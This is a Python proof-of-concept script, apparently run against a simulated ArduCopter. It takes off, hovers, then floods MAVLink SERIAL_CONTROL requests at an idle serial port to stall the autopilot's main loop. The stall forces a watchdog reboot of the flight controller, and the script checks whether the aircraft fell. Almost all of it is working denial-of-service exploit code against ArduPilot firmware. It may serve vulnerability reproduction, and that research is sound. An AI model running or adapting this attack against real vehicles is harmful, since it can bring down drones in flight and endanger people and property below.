#!/usr/bin/env python3
"""Take off the in-process ArduCopter, hover, then (automatically, no manual timing)
run the SERIAL_CONTROL attack and watch the altitude. A watchdog reset reboots the FC,
control stops and the aircraft falls. One MAVLink connection, so no two-client clash.

    fly_and_attack.py [--device 2] [--timeout-ms 3000] [--rate 20] [--attack-sec 15]

Try --device 2 (TELEM2), then 4, 5, 6: the attack needs a valid-but-idle serial port
so ArduPilot's delay(1) loop runs for the whole timeout and stalls main_loop.
"""
import argparse, sys, time
from pymavlink import mavutil

ap = argparse.ArgumentParser()
ap.add_argument("--device", type=int, default=2)
ap.add_argument("--timeout-ms", type=int, default=3000)
ap.add_argument("--rate", type=float, default=20.0)
ap.add_argument("--attack-sec", type=float, default=15.0)
ap.add_argument("--url", default="tcp:127.0.0.1:5760")
args = ap.parse_args()

DEVNUM = mavutil.mavlink.SERIAL_CONTROL_SERIAL0 + args.device
RESPOND = mavutil.mavlink.SERIAL_CONTROL_FLAG_RESPOND
EKF_NEEDED = (mavutil.mavlink.EKF_ATTITUDE | mavutil.mavlink.EKF_VELOCITY_HORIZ |
              mavutil.mavlink.EKF_VELOCITY_VERT | mavutil.mavlink.EKF_POS_HORIZ_ABS |
              mavutil.mavlink.EKF_POS_VERT_ABS)

m = mavutil.mavlink_connection(args.url, source_system=255)
m.wait_heartbeat(timeout=60)
last_hb = 0.0
def keepalive():
    global last_hb
    now = time.time()
    if now - last_hb >= 1.0:
        m.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID,0,0,0)
        for s in (mavutil.mavlink.MAV_DATA_STREAM_POSITION, mavutil.mavlink.MAV_DATA_STREAM_EXTENDED_STATUS):
            m.mav.request_data_stream_send(1,1,s,5,1)
        # EKF_STATUS_REPORT (193) is not in the default streams; ask for it like fly.py
        m.mav.command_long_send(1,1,mavutil.mavlink.MAV_CMD_SET_MESSAGE_INTERVAL,0,193,500000,0,0,0,0,0)
        last_hb = now

alt = None
reset_seen = False
watch_reset = False  # only count a reboot banner once the attack has begun
def note_statustext(text):
    global reset_seen
    print("AP:", text, flush=True)
    # The watchdog reset reboots the FC, which re-prints its boot banner.
    if watch_reset and "Initialising ArduPilot" in text:
        reset_seen = True
def pump(sec):
    global alt
    t0 = time.time()
    while time.time()-t0 < sec:
        keepalive()
        msg = m.recv_match(blocking=True, timeout=0.2)
        if not msg: continue
        if msg.get_type() == "GLOBAL_POSITION_INT": alt = msg.relative_alt/1000.0
        elif msg.get_type() == "STATUSTEXT": note_statustext(msg.text)

print("waiting for EKF...", flush=True)
t0 = time.time(); ekf_ok = False
while time.time()-t0 < 120:
    keepalive()
    r = m.recv_match(type="EKF_STATUS_REPORT", blocking=True, timeout=1)
    if r and (r.flags & EKF_NEEDED) == EKF_NEEDED and not (r.flags & mavutil.mavlink.EKF_CONST_POS_MODE):
        print("EKF ready", flush=True); ekf_ok = True; break
if not ekf_ok:
    print("EKF not confirmed in time; trying to arm anyway", flush=True)

m.set_mode("GUIDED"); pump(1)
m.mav.command_long_send(1,1,mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,0,1,0,0,0,0,0,0)
pump(2)
m.mav.command_long_send(1,1,mavutil.mavlink.MAV_CMD_NAV_TAKEOFF,0,0,0,0,0,0,0,2.5)
print("taking off to 2.5 m...", flush=True)
t0=time.time()
while time.time()-t0 < 40:
    pump(0.5)
    if alt is not None and alt > 2.2: break
print(f"hovering at {alt} m. attacking device {args.device} (SERIAL{args.device}) ...", flush=True)

# --- the attack, interleaved with altitude monitoring, on the one connection ---
watch_reset = True  # from here on, an "Initialising ArduPilot" banner means a reset
interval = 1.0/args.rate
base_alt = alt; min_alt = alt if alt else 99; sent = 0
t0 = time.time(); next_send = t0; last_print = t0
while time.time()-t0 < args.attack_sec:
    now = time.time()
    keepalive()
    if now >= next_send:
        m.mav.serial_control_send(DEVNUM, RESPOND, args.timeout_ms, 115200, 0, [0]*70)
        sent += 1; next_send += interval
    msg = m.recv_match(blocking=True, timeout=0.05)
    if msg and msg.get_type() == "GLOBAL_POSITION_INT":
        alt = msg.relative_alt/1000.0
        if alt is not None: min_alt = min(min_alt, alt)
    elif msg and msg.get_type() == "STATUSTEXT":
        note_statustext(msg.text)
    if now - last_print >= 1.0:
        print(f"  sent={sent} alt={alt} reset={reset_seen}", flush=True); last_print = now

# watch a few more seconds for a fall after the attack
print("attack done; watching for a fall...", flush=True)
t0 = time.time()
while time.time()-t0 < 10:
    pump(0.5)
    if alt is not None: min_alt = min(min_alt, alt)
    print(f"  alt={alt}", flush=True)

fell = (base_alt is not None and min_alt is not None and min_alt < base_alt - 1.0)
dos_ok = reset_seen or fell
print(f"\nRESULT device={args.device}: base_alt={base_alt} min_alt={min_alt} sent={sent} reset={reset_seen}", flush=True)
if reset_seen:
    print("*** DoS REPRODUCED: watchdog reset (the FC rebooted) ***", flush=True)
    print("    MAVLink altitude is stale after the reset; watch the viewer for the descent.", flush=True)
elif fell:
    print("*** CRASH / FELL (attack worked) ***", flush=True)
else:
    print("no reset, no fall (try another --device)", flush=True)
sys.exit(0 if dos_ok else 1)
